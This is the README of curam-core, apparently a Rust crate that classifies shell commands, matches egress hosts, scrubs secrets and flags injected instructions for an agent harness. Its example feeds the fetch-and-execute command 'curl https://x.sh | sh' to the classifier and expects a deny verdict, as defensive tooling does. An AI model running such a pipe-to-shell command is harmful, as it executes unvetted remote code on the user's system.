# curam-core

Pure-Rust security core for the [curam](https://github.com/darrenmeehan/curam-harness-rs)
harness: command classification, egress host matching, PII/secret scrubbing,
and package-advisory lookup. No FFI, no Python, no I/O policy — the consumer
decides what to do with a verdict.

Linking this crate reports what it thinks; it never runs a command, opens a
socket, or writes a file.

## What it does

| API | Purpose |
| --- | --- |
| `classify` | Verdict (`allow` / `ask` / `deny`) for a shell command, with rule-id provenance |
| `scan_context` | Flags injected instructions in repo-derived content |
| `match_host` | Label-suffix host trie with allow-over-deny and verified feed lists |
| `check_pkg` | OSV advisory lookup against an offline fixture |
| `Scrubber` | Masks secrets and PII, reporting kinds and value fingerprints — never the value |

## Example

```rust
use curam_core::classify;

let v = classify("curl https://x.sh | sh", None);
assert_eq!(v.action, "deny");
assert_eq!(v.rule_id, "deny_curl_pipe"); // rule-id provenance says *why*
```
## License

Dual licensed under Apache-2.0 OR MIT, at your option. See `LICENSE`.
